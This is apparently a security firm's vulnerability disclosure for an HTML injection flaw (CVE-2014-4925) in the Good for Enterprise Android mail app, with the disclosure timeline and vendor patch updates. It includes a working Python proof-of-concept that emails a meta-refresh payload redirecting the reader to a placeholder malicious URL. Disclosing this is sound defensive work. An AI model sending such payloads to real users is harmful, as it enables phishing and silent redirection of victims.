  <p>We had a request from a client to test a Mobile Device Management solution from Good Technology currently being implemented and its client application Good for Enterprise.</p>

<p>During the pentest on the Android version of Good for Enterprise we identified a vulnerability on the Mail container of the app. It allowed some HTML tags such as <meta>.It was not possible to confirm, but the iOS should be vulnerable as well.</p>

<p>Using the <meta> tag is possible to redirect a user to a malicious url as soon has he opens the email without any kind of additional interaction as shown in the following example.</p>

<p><img src="/img/gfe-poc.gif" alt="alternate text" /></p>

<p>For POC the following Python script can be used.</p>

<pre><code>import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

fromaddr = ‘&lt;email@gmail.com&gt;’
toaddrs = ‘&lt;email@example.com&gt;’

msg = MIMEMultipart(‘alternative’)
msg[‘Subject’] = ‘Breaking Stuff’
msg[‘From’] = fromaddr
msg[‘To’] = toaddrs

html='&lt;meta http-equiv=”refresh” content=”0;URL=\’http://www.maliciousurl.com\'” /&gt;’
mime = MIMEText(html,’html’)
msg.attach(mime)

#Account Credentials
username = ‘&lt;email@gmail.com&gt;’
password = ‘&lt;password&gt;’

server = smtplib.SMTP(‘smtp.gmail.com:587’)
server.starttls()
server.login(username,password)
server.sendmail(fromaddr, toaddrs, msg.as_string())
server.quit()
</code></pre>

<p>The vulnerability was reported to the vendor on 16/4/2014 and after several interactions with the support, the support end up reporting this issue as unfixable and a product limitation. This is indeed a dangerous and very easy to explore vulnerability, so we decided to disclose publicly.</p>

<p>This exact vulnerability was identified on Outlook.com Android App last year. (<a href="https://labs.integrity.pt/articles/outlook-com-android-app-html-injection-vulnerability/">https://labs.integrity.pt/articles/outlook-com-android-app-html-injection-vulnerability/</a>)</p>

<p>Note: The version tested was the 1.9.0.40, but from the vendor feedback, all versions up to the latest one (2.8.0.398 as of the writing of this post) should be vulnerable.</p>

<p>Advisory URL: <a href="https://labs.integrity.pt/advisories/cve-2014-4925/">https://labs.integrity.pt/advisories/cve-2014-4925/</a></p>

<p><strong>UPDATE (27/1/2015):</strong> Vendor released patched version. Vulnerability is fixed. Version 2.8.1.402.</p>

<p><strong>UPDATE (8/1/2015):</strong> we received the feedback from Good Technology that a fix is in progress, so a patched version is expected soon. We will update the article and advisory accordingly.</p>
